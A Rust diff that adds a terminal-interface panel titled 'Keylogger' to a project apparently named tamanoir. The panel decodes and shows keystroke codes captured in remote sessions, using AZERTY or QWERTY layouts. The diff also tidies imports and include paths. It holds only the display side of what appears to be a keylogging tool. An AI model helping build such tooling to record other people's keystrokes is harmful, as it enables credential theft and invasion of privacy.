@@ -1,9 +1,58 @@
 use std::{collections::HashMap, sync::OnceLock};
 
+use anyhow::Error;
+use ratatui::{
+    layout::Rect,
+    style::{Color, Style, Stylize},
+    text::{Span, Text},
+    widgets::{Block, BorderType, Paragraph, Wrap},
+    Frame,
+};
+use serde::Deserialize;
+use tamanoir_common::Layout;
+
+use crate::{app::AppResult, tamanoir_grpc::SessionResponse};
+
 pub static KEYMAPS: OnceLock<HashMap<u8, KeyMap>> = OnceLock::new();
-const AZERTY: &str = include_str!("../../../../assets/layouts/azerty.yml");
-const QWERTY: &str = include_str!("../../../../assets/layouts/qwerty.yml");
+const AZERTY: &str = include_str!("../../../assets/layouts/azerty.yml");
+const QWERTY: &str = include_str!("../../../assets/layouts/qwerty.yml");
 const COMMON_REPEATED_KEYS: [&str; 4] = [" 󱊷 ", " 󰌑 ", " 󰁮 ", "  "];
+
+pub fn render(
+    frame: &mut Frame,
+    block: Rect,
+    selected_session: &mut Option<SessionResponse>,
+    is_focused: bool,
+) {
+    let txt = match selected_session {
+        Some(session) => match parse_keycodes(
+            &session.key_codes,
+            Layout::from(session.keyboard_layout as u8),
+        ) {
+            Ok(kc) => Text::from(format_keys(kc)),
+
+            Err(_) => Text::from("Error decoding keycodes".to_string()).centered(),
+        },
+        _ => Text::from("No Session selected".to_string()).centered(),
+    };
+    let highlight_color = if is_focused {
+        Color::Yellow
+    } else {
+        Color::Blue
+    };
+    let p = Paragraph::new(txt).wrap(Wrap { trim: true }).block(
+        Block::bordered()
+            .border_type(BorderType::Rounded)
+            .border_style(Style::new().fg(highlight_color))
+            .title(Span::styled(
+                "Keylogger",
+                Style::default().fg(highlight_color).bold(),
+            )),
+    );
+
+    frame.render_widget(p, block);
+}
+
 pub fn init_keymaps() {
     let mut map = HashMap::<u8, KeyMap>::new();
     map.insert(
@@ -16,12 +65,6 @@ pub fn init_keymaps() {
     );
     KEYMAPS.set(map).expect("Error initializing KEYMAPS");
 }
-
-use anyhow::Error;
-use serde::Deserialize;
-use tamanoir_common::Layout;
-
-use crate::app::AppResult;
 
 #[derive(Deserialize, Debug)]
 pub struct KeyMap {
